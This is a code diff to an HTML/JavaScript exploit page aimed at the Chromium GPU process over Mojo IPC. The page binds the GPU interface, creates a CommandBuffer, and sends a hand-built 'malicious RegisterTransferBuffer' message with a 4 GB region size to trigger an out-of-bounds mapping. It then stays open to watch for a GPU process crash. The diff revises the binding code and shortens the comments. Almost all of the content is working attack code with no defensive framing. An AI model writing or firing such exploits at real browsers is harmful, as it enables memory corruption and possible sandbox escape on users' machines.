@@ -13,54 +13,47 @@
             console.log(msg);
         };
         try {
-            // 1. Bind to the GPU interface available in the renderer.
-            //    'viz.mojom.Gpu' is commonly exposed; fallback to 'gpu.mojom.GpuChannel' if needed.
-            let gpu;
+            // 1. Bind to the GPU interface (returns a raw Mojo handle)
+            let gpuHandle, gpu;
             try {
-                gpu = await Mojo.bindInterface('viz.mojom.Gpu');
+                gpuHandle = Mojo.bindInterface('viz.mojom.Gpu', 'browser');
+                gpu = new viz.mojom.GpuPtr(gpuHandle);
                 status('Bound to viz.mojom.Gpu');
             } catch (e) {
-                gpu = await Mojo.bindInterface('gpu.mojom.GpuChannel');
+                gpuHandle = Mojo.bindInterface('gpu.mojom.GpuChannel', 'browser');
+                gpu = new gpu.mojom.GpuChannelPtr(gpuHandle);
                 status('Bound to gpu.mojom.GpuChannel');
             }
 
-            // 2. Create a message pipe for the CommandBuffer.
+            // 2. Create a message pipe for the CommandBuffer and its client
             const {handle0: cmdBufferHandle, handle1: cmdBufferServer} = Mojo.createMessagePipe();
-
-            // 3. Create a dummy pipe for the CommandBufferClient (we won't read it).
             const {handle0: clientHandle, handle1: clientServer} = Mojo.createMessagePipe();
 
-            // 4. Build the CreateCommandBufferParams.
-            //    We need a shared memory handle for the shared state.
-            //    Use a small 4KB shared buffer – its size doesn't matter for the exploit.
+            // 3. Create a small shared buffer for the shared state (size doesn't matter)
             const sharedState = Mojo.createSharedBuffer(4096);
-            //    Construct the params object (types from gpu/ipc/common/gpu_channel.mojom).
+
+            // 4. Build the CreateCommandBufferParams
             const createParams = {
-                // The first field is a `CommandBufferParams` (inner struct).
-                // Provide a minimal valid config. Many fields can be default/zero.
                 params: {
-                    // This is a nested struct; we can create an empty object and rely on defaults.
-                    // The mojom defines: int32 stream_id, int32 route_id, uint32 flush_id, etc.
-                    // Set a few safe values.
+                    // CommandBufferParams – minimal valid values
                     streamId: 1,
-                    routeId: 1,
-                    // The rest are zero by default in the JS binding.
+                    routeId: 1
+                    // other fields are optional and will default to 0
                 },
-                sharedState: sharedState.handle,          // Mojo handle to shared state
-                receiver: cmdBufferServer,                // server end of the CommandBuffer pipe
-                client: clientServer,                     // server end of the CommandBufferClient pipe
+                sharedState: sharedState.handle,   // shared buffer handle
+                receiver: cmdBufferServer,          // server end of CommandBuffer pipe
+                client: clientServer                // server end of CommandBufferClient pipe
             };
 
-            // 5. Request a new CommandBuffer.
+            // 5. Request a new CommandBuffer (async)
             await gpu.createCommandBuffer(createParams);
             status('CommandBuffer created');
 
-            // 6. We now have the CommandBuffer remote in cmdBufferHandle (client end).
-            //    Wrap it in the generated JS interface to get the underlying Mojo handle.
+            // 6. Wrap the client handle in the generated remote
             const cmdBuffer = new gpu.mojom.CommandBufferPtr(cmdBufferHandle);
             const pipeHandle = cmdBuffer.ptr.getHandle();
 
-            // 7. Craft the malicious RegisterTransferBuffer message (ordinal 4).
+            // 7. Craft the malicious RegisterTransferBuffer message (ordinal 4)
             const payload = new ArrayBuffer(256);
             const view = new DataView(payload);
 
@@ -81,15 +74,15 @@
             // Huge region size → out-of-bounds mapping
             view.setBigUint64(0x50, BigInt(0x100000000), true); // 4 GB
 
-            // Create a small valid shared buffer to attach (4 KB).
+            // Create a small valid shared buffer to attach (4 KB)
             const sharedBuffer = Mojo.createSharedBuffer(4096);
             const handles = [sharedBuffer.handle];
 
-            // 8. Send the raw message directly on the CommandBuffer pipe.
+            // 8. Send the raw message directly on the CommandBuffer pipe
             pipeHandle.writeMessage(payload, handles);
             status('Malicious RegisterTransferBuffer sent!');
 
-            // 9. Keep the page alive, check for GPU process crash.
+            // Keep the page alive so you can observe the GPU process
             setInterval(() => {}, 10000);
         } catch (err) {
             status('Error: ' + err.message + ' (see console)');
